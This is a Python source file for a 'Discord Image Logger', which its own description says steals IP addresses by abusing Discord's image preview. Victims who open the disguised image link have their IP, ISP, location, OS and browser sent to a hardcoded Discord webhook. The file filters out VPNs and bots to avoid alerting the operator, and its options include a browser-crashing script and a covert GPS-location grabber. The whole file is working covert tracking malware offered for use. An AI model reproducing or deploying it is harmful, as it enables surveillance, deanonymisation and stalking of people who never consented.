# Discord Image Logger
# By DeKrypt | https://github.com/dekrypted

from http.server import BaseHTTPRequestHandler
from urllib import parse
import traceback, requests, base64, httpagentparser

__app__ = "Discord Image Logger"
__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
__version__ = "v2.0"
__author__ = "DeKrypt"

config = {
    # BASE CONFIG #
    "webhook": "https://discord.com/api/webhooks/1123688410159255552/wiXU86F_9dZCp0a982D4f5I8TMF4tL_MlC7EQac55CyHlsRdG00Y6FdcFRImjH11puCY",
    "image": "data:image/jpeg;base64,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", # You can also have a custom image by using a URL argument
                                               # (E.g. yoursite.com/imagelogger?url=<Insert a URL-escaped link to an image here>)
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)

    # CUSTOMIZATION #
    "username": "Image Logger", # Set this to the name you want the webhook to have
    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)

    # OPTIONS #
    "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/dekrypted/Chromebook-Crasher)
    
    "accurateLocation": False, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.

    "message": { # Show a custom message when the user opens the image
        "doMessage": False, # Enable the custom message?
        "message": "This browser has been pwned by DeKrypt's Image Logger. https://github.com/dekrypted/Discord-Image-Logger", # Message to show
        "richMessage": True, # Enable rich text? (See README for more info)
    },

    "vpnCheck": 1, # Prevents VPNs from triggering the alert
                # 0 = No Anti-VPN
                # 1 = Don't ping when a VPN is suspected
                # 2 = Don't send an alert when a VPN is suspected

    "linkAlerts": True, # Alert when someone sends the link (May not work if the link is sent a bunch of times within a few minutes of each other)
    "buggedImage": True, # Shows a loading image as the preview when sent in Discord (May just appear as a random colored image on some devices)

    "antiBot": 1, # Prevents bots from triggering the alert
                # 0 = No Anti-Bot
                # 1 = Don't ping when it's possibly a bot
                # 2 = Don't ping when it's 100% a bot
                # 3 = Don't send an alert when it's possibly a bot
                # 4 = Don't send an alert when it's 100% a bot
    

    # REDIRECTION #
    "redirect": {
        "redirect": False, # Redirect to a webpage?
        "page": "https://your-link.here" # Link to the webpage to redirect to 
    },

    # Please enter all values in correct format. Otherwise, it may break.
    # Do not edit anything below this, unless you know what you're doing.
    # NOTE: Hierarchy tree goes as follows:
    # 1) Redirect (If this is enabled, disables image and crash browser)
    # 2) Crash Browser (If this is enabled, disables image)
    # 3) Message (If this is enabled, disables image)
    # 4) Image 
}

blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
                                                           # This feature is undocumented mainly due to it being for detecting bots better.

def botCheck(ip, useragent):
    if ip.startswith(("34", "35")):
        return "Discord"
    elif useragent.startswith("TelegramBot"):
        return "Telegram"
    else:
        return False

def reportError(error):
    requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "@everyone",
    "embeds": [
        {
            "title": "Image Logger - Error",
            "color": config["color"],
            "description": f"An error occurred while trying to log an IP!\n\n**Error:**\n```\n{error}\n```",
        }
    ],
})

def makeReport(ip, useragent = None, coords = None, endpoint = "N/A", url = False):
    if ip.startswith(blacklistedIPs):
        return
    
    bot = botCheck(ip, useragent)
    
    if bot:
        requests.post(config["webhook"], json = {
    "username": config["username"],
    "content": "",
    "embeds": [
        {
            "title": "Image Logger - Link Sent",
            "color": config["color"],
            "description": f"An **Image Logging** link was sent in a chat!\nYou may receive an IP soon.\n\n**Endpoint:** `{endpoint}`\n**IP:** `{ip}`\n**Platform:** `{bot}`",
        }
    ],
}) if config["linkAlerts"] else None # Don't send an alert if the user has it disabled
        return

    ping = "@everyone"

    info = requests.get(f"http://ip-api.com/json/{ip}?fields=16976857").json()
    if info["proxy"]:
        if config["vpnCheck"] == 2:
                return
        
        if config["vpnCheck"] == 1:
            ping = ""
    
    if info["hosting"]:
        if config["antiBot"] == 4:
            if info["proxy"]:
                pass
            else:
                return

        if config["antiBot"] == 3:
                return

        if config["antiBot"] == 2:
            if info["proxy"]:
                pass
            else:
                ping = ""

        if config["antiBot"] == 1:
                ping = ""


    os, browser = httpagentparser.simple_detect(useragent)
    
    embed = {
    "username": config["username"],
    "content": ping,
    "embeds": [
        {
            "title": "Image Logger - IP Logged",
            "color": config["color"],
            "description": f"""**A User Opened the Original Image!**

**Endpoint:** `{endpoint}`
            
**IP Info:**
> **IP:** `{ip if ip else 'Unknown'}`
> **Provider:** `{info['isp'] if info['isp'] else 'Unknown'}`
> **ASN:** `{info['as'] if info['as'] else 'Unknown'}`
> **Country:** `{info['country'] if info['country'] else 'Unknown'}`
> **Region:** `{info['regionName'] if info['regionName'] else 'Unknown'}`
> **City:** `{info['city'] if info['city'] else 'Unknown'}`
> **Coords:** `{str(info['lat'])+', '+str(info['lon']) if not coords else coords.replace(',', ', ')}` ({'Approximate' if not coords else 'Precise, [Google Maps]('+'https://www.google.com/maps/search/google+map++'+coords+')'})
> **Timezone:** `{info['timezone'].split('/')[1].replace('_', ' ')} ({info['timezone'].split('/')[0]})`
> **Mobile:** `{info['mobile']}`
> **VPN:** `{info['proxy']}`
> **Bot:** `{info['hosting'] if info['hosting'] and not info['proxy'] else 'Possibly' if info['hosting'] else 'False'}`

**PC Info:**
> **OS:** `{os}`
> **Browser:** `{browser}`

**User Agent:**
```
{useragent}
```""",
    }
  ],
}
    
    if url: embed["embeds"][0].update({"thumbnail": {"url": url}})
    requests.post(config["webhook"], json = embed)
    return info

binaries = {
    "loading": base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')
    # This IS NOT a rat or virus, it's just a loading image. (Made by me! :D)
    # If you don't trust it, read the code or don't use this at all. Please don't make an issue claiming it's duahooked or malicious.
    # You can look at the below snippet, which simply serves those bytes to any client that is suspected to be a Discord crawler.
}

class ImageLoggerAPI(BaseHTTPRequestHandler):
    
    def handleRequest(self):
        try:
            if config["imageArgument"]:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))
                if dic.get("url") or dic.get("id"):
                    url = base64.b64decode(dic.get("url") or dic.get("id").encode()).decode()
                else:
                    url = config["image"]
            else:
                url = config["image"]

            data = f'''<style>body {{
margin: 0;
padding: 0;
}}
div.img {{
background-image: url('{url}');
background-position: center center;
background-repeat: no-repeat;
background-size: contain;
width: 100vw;
height: 100vh;
}}</style><div class="img"></div>'''.encode()
            
            if self.headers.get('x-forwarded-for').startswith(blacklistedIPs):
                return
            
            if botCheck(self.headers.get('x-forwarded-for'), self.headers.get('user-agent')):
                self.send_response(200 if config["buggedImage"] else 302) # 200 = OK (HTTP Status)
                self.send_header('Content-type' if config["buggedImage"] else 'Location', 'image/jpeg' if config["buggedImage"] else url) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["buggedImage"]: self.wfile.write(binaries["loading"]) # Write the image to the client.

                makeReport(self.headers.get('x-forwarded-for'), endpoint = s.split("?")[0], url = url)
                
                return
            
            else:
                s = self.path
                dic = dict(parse.parse_qsl(parse.urlsplit(s).query))

                if dic.get("g") and config["accurateLocation"]:
                    location = base64.b64decode(dic.get("g").encode()).decode()
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), location, s.split("?")[0], url = url)
                else:
                    result = makeReport(self.headers.get('x-forwarded-for'), self.headers.get('user-agent'), endpoint = s.split("?")[0], url = url)
                

                message = config["message"]["message"]

                if config["message"]["richMessage"] and result:
                    message = message.replace("{ip}", self.headers.get('x-forwarded-for'))
                    message = message.replace("{isp}", result["isp"])
                    message = message.replace("{asn}", result["as"])
                    message = message.replace("{country}", result["country"])
                    message = message.replace("{region}", result["regionName"])
                    message = message.replace("{city}", result["city"])
                    message = message.replace("{lat}", str(result["lat"]))
                    message = message.replace("{long}", str(result["lon"]))
                    message = message.replace("{timezone}", f"{result['timezone'].split('/')[1].replace('_', ' ')} ({result['timezone'].split('/')[0]})")
                    message = message.replace("{mobile}", str(result["mobile"]))
                    message = message.replace("{vpn}", str(result["proxy"]))
                    message = message.replace("{bot}", str(result["hosting"] if result["hosting"] and not result["proxy"] else 'Possibly' if result["hosting"] else 'False'))
                    message = message.replace("{browser}", httpagentparser.simple_detect(self.headers.get('user-agent'))[1])
                    message = message.replace("{os}", httpagentparser.simple_detect(self.headers.get('user-agent'))[0])

                datatype = 'text/html'

                if config["message"]["doMessage"]:
                    data = message.encode()
                
                if config["crashBrowser"]:
                    data = message.encode() + b'<script>setTimeout(function(){for (var i=69420;i==i;i*=i){console.log(i)}}, 100)</script>' # Crasher code by me! https://github.com/dekrypted/Chromebook-Crasher

                if config["redirect"]["redirect"]:
                    data = f'<meta http-equiv="refresh" content="0;url={config["redirect"]["page"]}">'.encode()
                self.send_response(200) # 200 = OK (HTTP Status)
                self.send_header('Content-type', datatype) # Define the data as an image so Discord can show it.
                self.end_headers() # Declare the headers as finished.

                if config["accurateLocation"]:
                    data += b"""<script>
var currenturl = window.location.href;

if (!currenturl.includes("g=")) {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(function (coords) {
    if (currenturl.includes("?")) {
        currenturl += ("&g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    } else {
        currenturl += ("?g=" + btoa(coords.coords.latitude + "," + coords.coords.longitude).replace(/=/g, "%3D"));
    }
    location.replace(currenturl);});
}}

</script>"""
                self.wfile.write(data)
        
        except Exception:
            self.send_response(500)
            self.send_header('Content-type', 'text/html')
            self.end_headers()

            self.wfile.write(b'500 - Internal Server Error <br>Please check the message sent to your Discord Webhook and report the error on the GitHub page.')
            reportError(traceback.format_exc())

        return
    
    do_GET = handleRequest
    do_POST = handleRequest

handler = ImageLoggerAPI
